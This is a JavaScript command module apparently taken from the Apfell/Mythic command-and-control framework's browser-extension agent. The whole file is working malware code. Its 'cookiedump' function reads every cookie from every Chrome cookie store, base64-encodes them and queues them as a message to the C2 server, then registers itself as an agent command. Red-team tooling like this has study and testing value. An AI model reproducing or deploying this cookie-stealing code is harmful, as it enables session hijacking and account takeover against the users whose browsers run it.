cookiedump = function(params) {
    let results = [];
    let taskid = params['taskid'];
    let tasktype = params['tasktype'];
    chrome.cookies.getAllCookieStores(function(stores) {
        stores.forEach(function (store) {
            const filter = {};
            filter["storeId"] = store.id;
            chrome.cookies.getAll({"storeId": store.id}, function (cookies) {
                const data = btoa(JSON.stringify(cookies, null, 2));
                const apfellmsg = CreateApfellMessage(2, apfell.apfellID, apfell.UUID, data.length, taskid, tasktype, data);
                let meta = {};
                meta["metatype"] = 3;
                meta["metadata"] = apfellmsg;
                const metaenvelope = JSON.stringify(meta);
                out.push(metaenvelope);
            });
        });
    });
};

C2.commands[cookiedump.name] = cookiedump;
COMMAND_ENDS_HERE
